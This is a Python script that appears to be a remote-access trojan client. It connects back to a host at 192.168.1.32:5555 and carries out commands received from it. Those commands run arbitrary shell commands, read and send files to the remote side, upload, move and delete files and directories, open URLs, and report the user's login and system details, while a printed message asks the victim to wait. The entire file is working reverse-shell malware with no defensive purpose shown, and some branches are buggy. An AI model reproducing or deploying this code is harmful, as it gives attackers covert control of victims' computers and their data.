
import os
import socket
import platform
import webbrowser
arr=[]
m=0
s=socket.socket()
host="192.168.1.32"
port=5555
s.connect((host, port))

print("Pleas Dont Leave Just Wait 10 minute")


while True:

    txt=s.recv(1024)
    txt=txt.decode()
    try:
        if txt == "get_cwd":
            command=os.getcwd()
            command=command.encode()
            s.send(command)


        if txt == "get_login":
            command=os.getlogin()
            command=command.encode()
            s.send(command)

        if txt == "get_platform":
            command=platform.uname()
            command=str(command)
            command=command.encode()
            s.send(command)
    
        if txt == "dir":
            dir=os.getcwd()
            dir=str(dir)
            list_dir=os.listdir(dir)
            list_dir=str(list_dir)
            list_dir=list_dir.encode()
            s.send(list_dir)

        if txt =="cd":
            path=s.recv(1024)
            path=path.decode()
            path=str(path)
            os.chdir(path)
            location=os.getcwd()
            text="Your Location Is "+location
            text=text.encode()
            s.send(text)
    
        if txt == "start_file":
            text=s.recv(1024)
            text=text.decode()
            result=os.startfile(text)
            text_01="The File Is Started !!"
            text_01=text_01.encode()
            s.send(text_01)
    
        if txt =="get_ip":
            my_ip=str(my_ip)
            my_ip=my_ip.encode()
            s.send(my_ip)

        if txt == "mkdir":
            mk=s.recv(1024)
            mk=mk.decode()
            mk=str(mk)
            name_dir=os.mkdir(mk)
            mk_txt=mk+" Was Created Successfully !!"
            mk_txt=mk_txt.encode()
            s.send(mk_txt)
    
        if txt == "echo":
            echo=s.recv(1024)
            echo=echo.decode()
            echo=str(echo)
            os.system(echo)
            echo_txt="The Command Was Doit Successfully"
            echo_txt=str(echo_txt).encode()
            s.send(echo_txt)
    
        if txt == "read_file":
            name_file=s.recv(1024)
            name_file=name_file.decode()
            name_file=str(name_file)
            open_f=open(name_file,"rb")
            open1=open_f.read()
            s.send(open1)

        if txt == "rm":
            r_txt=s.recv(1024)
            r_txt=r_txt.decode()
            os.remove(r_txt)
            res="The Code Has Been Doit Succesfully"
            s.send(res.encode())
    

        if txt =="download":
            down=s.recv(1024)
            down=down.decode()
            filee=open(down,"rb")
            data=filee.read()
            s.send(data)
        
        if txt =="rmdir":
            r_d=s.recv(1024)
            r_d=r_d.decode()
            os.removedirs(r_d)
            text01="The Derictory "+r_d+" Was Delated !"
            text01=text01.encode()
            s.send(text01)

        if txt =="upload":
            get=s.recv(1024)
            arr.append(get)
            get2=s.recv(10000000)
            data=open(arr[0],"wb")
            data.write(get2)
            data.close()
            txt="The File Was Uploaded !!"
            txt=txt.encode()
            s.send(txt)
        
        if txt =="mv":
            arr=[]
            get=s.recv(10000)
            get=get.decode()
            arr.append(get)
            get_02=s.recv(10000)
            get_02=get_02.decode()
            arr.append(get_02)
            os.rename(arr[0],arr[1])
            txt="The File "+arr[0]+" Was Changed TO ==> "+arr[1]
            txt=txt.encode()
            s.send(txt)

            name_1=arr[0]
            name_2=arr[1]
            m=1

        if txt =="open_url":
            url_02=s.recv(1024)
            url_02=url_02.decode()
            webbrowser.open(url_02)
            txt="The Web Is Opend Now !!"
            s.send(txt.encode())
            m=1
            

        if txt =="cp":
            arr_1=[]
            comm=s.recv(10000)
            comm=comm.decode()
            arr_1.append(comm)
            comm_02=s.recv(10000)
            comm_02=comm_02.decode()
            os.replace(arr_1[0],comm_02)
            xtx="The File "+str(arr_1)+" Has Replaced To "+comm_02
            s.send(xtx.encode())

        if txt =="cmd":
            command1=s.recv(1024)
            command1=command1.decode()
            command1=":end "+str(command1)
            os.system(command1.decode())
            s.send("The Code Has been done .")
    except:
        s.send("Eror in the command !!".encode())

